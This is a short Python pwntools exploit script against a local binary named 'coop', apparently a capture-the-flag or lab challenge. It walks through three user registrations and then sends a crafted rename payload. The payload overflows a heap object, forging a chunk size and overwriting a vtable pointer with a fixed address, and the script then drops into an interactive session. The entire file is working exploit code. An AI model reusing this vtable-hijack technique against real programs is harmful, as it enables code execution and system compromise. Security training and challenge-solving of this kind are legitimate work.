#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
context.log_level = "debug"
r = process('./coop')
# plz set the vul vtable addr
vtable_add =0x200dd8
_data=b'd'*8+p64(0x41)+p64(vtable_add)

def Main():
    r.recvuntil(b"Admin registration:\n")
    r.sendline(b"aaaa")
    r.recvuntil(b"UserA registration:\n")
    r.sendline(b"bbbb")
    r.recvuntil(b"UserB registration:\n")
    r.sendline(b"cccc")
    r.recvuntil(b"UserA Rename:\n")
    r.sendline(_data)
    r.recvuntil(b"Check UserB again:\n")

Main()
r.interactive()

